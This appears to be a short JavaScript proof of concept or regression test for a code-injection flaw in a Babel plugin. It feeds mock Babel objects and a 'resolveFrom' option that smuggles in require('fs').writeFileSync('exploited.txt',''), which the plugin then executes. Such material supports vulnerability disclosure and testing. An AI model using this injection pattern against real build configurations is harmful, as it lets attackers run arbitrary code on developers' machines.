'use strict'

const pkg = require('../src');

const ref = { types: { isIdentifier: function() { return true; }, isMemberExpression: function() {} } }
const nodePath = { node: { callee: { object: '' }, arguments: [{ type: 'StringLiteral'}]} };

const state = { opts: {resolveFrom: `require('fs').writeFileSync('exploited.txt','');['./']`}, file: { opts: { } } }

pkg.default(ref).visitor.CallExpression.exit(nodePath, state);